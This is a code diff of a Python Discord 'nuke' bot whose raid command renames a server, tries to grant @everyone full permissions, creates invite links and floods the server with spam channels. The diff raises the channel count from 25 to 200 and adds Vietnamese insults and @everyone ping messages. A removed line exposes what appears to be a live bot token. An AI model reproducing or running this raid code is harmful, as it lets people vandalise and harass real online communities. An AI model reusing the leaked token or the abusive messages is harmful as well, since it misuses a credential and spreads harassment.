@@ -24,7 +24,7 @@ from os import system
 
 prefix = "y"
 intents = discord.Intents().all() # Set Discord Intents to default
-TOKEN = 'MTAwNjk1NjkyNDk1NDIxNDQ5Mg.GIGUpf.8Sj5lBEQwy9ZcxMRVdcAITwUsnMv62aKBq3RhQ' # put ur bot token here, dude
+TOKEN = '' # put ur bot token here, dude
 
 
 
@@ -40,7 +40,7 @@ async def raid(ctx):
   if ctx.author.id:
     guild = ctx.guild
     await ctx.message.delete()
-    await ctx.guild.edit(name="Nuked Heaven")
+    await ctx.guild.edit(name="ET ON THE TOP")
     try:
         role = discord.utils.get(guild.roles, name="@everyone")
         await role.edit(permissions=Permissions.all())
@@ -74,12 +74,12 @@ async def raid(ctx):
         link = await channel.create_invite(max_age=0, max_uses=0)
         print(f"new invite: {link}")
     amount = 1
-    for i in range(25):
+    for i in range(200):
         await guild.create_text_channel(random.choice(SPAM_CHANNEL))
     print(f"nuked {guild.name} sucessfully.")
     return
 
-SPAM_CHANNEL = ["Heaven On The top"]
+SPAM_CHANNEL = [".gg/ditconmemay" , "bại não à cu" , "bt setup sv k lũ bại não"]
 
 
 
@@ -210,7 +210,7 @@ async def on_ready():
 
 @client.event 
 async def on_guild_channel_create(channel):
-    msg = """Nuked by Heaven https://discord.gg/heavenhell @everyone @everyone @everyone @everyone @everyone 
+    msg = """lũ óc cặc  , ngu như mẹ mày vậy , chết con mẹ mày đi , setup như lồn mẹ m @everyone https://discord.gg/wKukuY2J
 
     """
     a = 1
